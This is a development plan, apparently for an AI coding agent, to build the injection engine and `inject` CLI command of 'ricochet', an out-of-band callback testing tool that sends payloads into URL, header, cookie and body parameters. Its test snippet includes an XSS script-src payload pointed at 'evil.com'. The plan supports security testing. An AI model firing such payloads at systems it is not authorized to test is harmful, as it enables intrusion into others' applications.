---
phase: 04-injection-engine
plan: 03
type: execute
wave: 2
depends_on: ["04-01", "04-02"]
files_modified:
  - ricochet/injection/injector.py
  - ricochet/injection/__init__.py
  - ricochet/cli.py
autonomous: true

must_haves:
  truths:
    - "User can inject into specific URL/parameter via CLI"
    - "User can provide Burp-format request file for injection"
    - "Tool injects into all identified input vectors"
    - "Injections are recorded in database with correlation IDs"
  artifacts:
    - path: "ricochet/injection/injector.py"
      provides: "Multi-vector injection orchestration"
      exports: ["Injector", "inject_payload"]
    - path: "ricochet/cli.py"
      provides: "inject subcommand"
      contains: "inject_parser"
  key_links:
    - from: "ricochet/injection/injector.py"
      to: "ricochet/injection/http_client.py"
      via: "send_request for payload delivery"
      pattern: "send_request"
    - from: "ricochet/injection/injector.py"
      to: "ricochet/core/store.py"
      via: "InjectionStore for tracking"
      pattern: "record_injection"
    - from: "ricochet/cli.py"
      to: "ricochet/injection/injector.py"
      via: "cmd_inject handler"
      pattern: "from ricochet\\.injection"
---

<objective>
Wire the injection engine together with CLI interface for injecting payloads.

Purpose: Enable users to inject payloads into targets via `ricochet inject -u URL -p param` or `ricochet inject -r request.txt`, automatically testing all identified input vectors and recording injections for callback correlation.

Output: Complete injection workflow from CLI to HTTP requests with database tracking.
</objective>

<execution_context>
@~/.claude/get-shit-done/workflows/execute-plan.md
@~/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/phases/04-injection-engine/04-RESEARCH.md
@.planning/phases/04-injection-engine/04-01-SUMMARY.md
@.planning/phases/04-injection-engine/04-02-SUMMARY.md
@ricochet/cli.py
@ricochet/core/store.py
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create injection orchestrator</name>
  <files>
    ricochet/injection/injector.py
    ricochet/injection/__init__.py
  </files>
  <action>
Create `injector.py` with multi-vector injection logic:

1. `InjectionResult` dataclass:
   ```python
   @dataclass
   class InjectionResult:
       correlation_id: str
       vector: InjectionVector
       url: str
       status: int           # HTTP response status
       success: bool         # Request completed (not timeout/error)
       error: Optional[str]  # Error message if failed
   ```

2. `Injector` class:
   ```python
   class Injector:
       def __init__(
           self,
           store: InjectionStore,
           rate_limiter: Optional[RateLimiter] = None,
           timeout: float = 10.0,
           callback_url: str = "http://localhost:8080"
       ):
           self.store = store
           self.rate_limiter = rate_limiter or RateLimiter(rate=10, burst=1)
           self.timeout = timeout
           self.callback_url = callback_url
   ```

3. Key methods:

   `inject_vector(request: ParsedRequest, vector: InjectionVector, payload: str) -> InjectionResult`:
   - Generate correlation ID
   - Substitute `{{CALLBACK}}` in payload with `{callback_url}/{correlation_id}`
   - Inject payload into the specified vector location
   - Send request via `send_request()`
   - Record injection in store
   - Return InjectionResult

   `inject_all_vectors(request: ParsedRequest, payload: str) -> list[InjectionResult]`:
   - Extract all vectors from request
   - Inject payload into each vector
   - Return list of results

   **Injection by vector type:**
   - `query`: Use `inject_into_path()` from parser module
   - `header`: Modify headers dict, rebuild request
   - `cookie`: Modify Cookie header value
   - `body`: Re-encode form body with injected value, update Content-Length
   - `json`: Modify JSON field, re-serialize, update Content-Length

4. Helper for placeholder substitution:
   ```python
   def substitute_callback(payload: str, callback_url: str, correlation_id: str) -> str:
       """Replace {{CALLBACK}} variants with actual callback URL."""
   ```
   Support: `{{CALLBACK}}`, `{{callback}}`, `{CALLBACK}`, `${CALLBACK}`

Update `__init__.py` to export `Injector`, `InjectionResult`.
  </action>
  <verify>
```python
python3 -c "
from ricochet.injection.injector import Injector, InjectionResult, substitute_callback
from ricochet.injection.parser import parse_request_file
from ricochet.injection.vectors import extract_vectors
from ricochet.core.store import InjectionStore
import tempfile, os

# Test placeholder substitution
payload = '<script src=\"{{CALLBACK}}\"></script>'
result = substitute_callback(payload, 'http://evil.com', 'abc123')
assert 'http://evil.com/abc123' in result
print('Placeholder substitution OK')

# Test injector initialization
with tempfile.TemporaryDirectory() as tmpdir:
    db_path = os.path.join(tmpdir, 'test.db')
    store = InjectionStore(db_path)
    injector = Injector(store, timeout=5.0, callback_url='http://callback.test')

    # Parse a request
    request = b'GET /test?id=1 HTTP/1.1\r\nHost: example.com\r\n\r\n'
    parsed = parse_request_file(request)
    vectors = extract_vectors(parsed)

    assert len(vectors) >= 1  # At least the 'id' query param
    print(f'Injector initialized, found {len(vectors)} vectors')
"
```
  </verify>
  <done>Injector class orchestrates payload injection across all vector types with correlation ID tracking</done>
</task>

<task type="auto">
  <name>Task 2: Add inject subcommand to CLI</name>
  <files>
    ricochet/cli.py
  </files>
  <action>
Add `inject` subcommand to CLI:

1. Create inject subparser with arguments:
   ```python
   inject_parser = subparsers.add_parser(
       'inject',
       help='Inject payloads into target'
   )

   # Target specification (mutually exclusive group)
   target_group = inject_parser.add_mutually_exclusive_group(required=True)
   target_group.add_argument('-u', '--url', help='Target URL')
   target_group.add_argument('-r', '--request', type=Path, help='Burp-format request file')

   # Parameter specification (optional with -u, ignored with -r)
   inject_parser.add_argument('-p', '--param', help='Specific parameter to inject (with -u)')

   # Payload
   inject_parser.add_argument('--payload', default='{{CALLBACK}}',
       help='Payload template with {{CALLBACK}} placeholder')

   # Callback configuration
   inject_parser.add_argument('--callback-url', default='http://localhost:8080',
       help='Callback URL base (default: http://localhost:8080)')

   # Rate limiting
   inject_parser.add_argument('--rate', type=float, default=10.0,
       help='Requests per second (default: 10)')

   # Timeout
   inject_parser.add_argument('--timeout', type=float, default=10.0,
       help='Request timeout in seconds (default: 10)')

   # HTTPS
   inject_parser.add_argument('--https', action='store_true',
       help='Use HTTPS for URL construction')

   inject_parser.set_defaults(func=cmd_inject)
   ```

2. `cmd_inject(args, store) -> int`:
   - If `-u URL`: Build simple GET request from URL
   - If `-r request.txt`: Read and parse Burp-format file (binary mode!)
   - Create Injector with specified rate/timeout/callback
   - If `--param` specified: inject only that parameter
   - Otherwise: inject all vectors
   - Print results (correlation IDs, success/failure for each vector)
   - Return 0 on success, 1 on errors

**Important:** Read request files in binary mode (`rb`) to preserve CRLF line endings.
  </action>
  <verify>
```bash
# Test CLI argument parsing
python3 -m ricochet inject --help | grep -E "(-u|--url|-r|--request|--payload|--rate|--timeout)"

# Test that mutually exclusive group works
python3 -m ricochet inject 2>&1 | grep -i "required"
```
  </verify>
  <done>inject subcommand added to CLI with -u/--url, -r/--request, --payload, --rate, --timeout options</done>
</task>

<task type="auto">
  <name>Task 3: End-to-end injection test</name>
  <files>
    ricochet/injection/injector.py
  </files>
  <action>
Add integration test capability and verify end-to-end flow:

1. Add `--dry-run` flag to inject command:
   - Shows what would be injected without sending requests
   - Prints: vector location, parameter name, modified URL/value
   - Useful for verification without live target

2. Create a test script that verifies full flow:
   - Start a simple HTTP server (using http.server)
   - Run injection against it
   - Verify requests received with injected payloads
   - Verify database records created

3. Ensure error handling:
   - Invalid URL format -> clear error message
   - Non-existent request file -> clear error message
   - Network errors -> report and continue with other vectors
   - All vectors failed -> return exit code 1
  </action>
  <verify>
```bash
# Create a test request file
cat > /tmp/test_request.txt << 'EOF'
GET /search?q=test&page=1 HTTP/1.1
Host: httpbin.org
User-Agent: Ricochet/1.0

EOF

# Test dry-run mode
python3 -m ricochet inject -r /tmp/test_request.txt --dry-run --payload "INJECT-{{CALLBACK}}" 2>&1 | head -20

# Verify injection records in database
python3 -c "
from ricochet.core.store import InjectionStore, get_db_path
store = InjectionStore(get_db_path())
injections = store.list_injections(limit=5)
print(f'Recent injections: {len(injections)}')
for inj in injections[:3]:
    print(f'  {inj.id}: {inj.target_url} -> {inj.parameter}')
"
```
  </verify>
  <done>End-to-end injection flow works with dry-run mode, proper error handling, and database tracking</done>
</task>

</tasks>

<verification>
All tasks complete when:
1. `ricochet inject -u URL -p param` injects payload into specific parameter
2. `ricochet inject -r request.txt` parses and injects into all vectors
3. Injections are recorded in SQLite database with correlation IDs
4. Rate limiting prevents exceeding specified requests/second
5. Timeout errors are handled gracefully
6. `--dry-run` mode shows injection plan without sending requests
</verification>

<success_criteria>
- User can inject via `-u URL` for quick single-target testing
- User can inject via `-r request.txt` for Burp-exported requests
- All vector types (query, header, cookie, body, json) are injectable
- Each injection gets unique correlation ID for callback tracking
- Rate limiting and timeout are configurable
- Dry-run mode enables verification without network activity
- Clear error messages for invalid inputs or network failures
</success_criteria>

<output>
After completion, create `.planning/phases/04-injection-engine/04-03-SUMMARY.md`
</output>
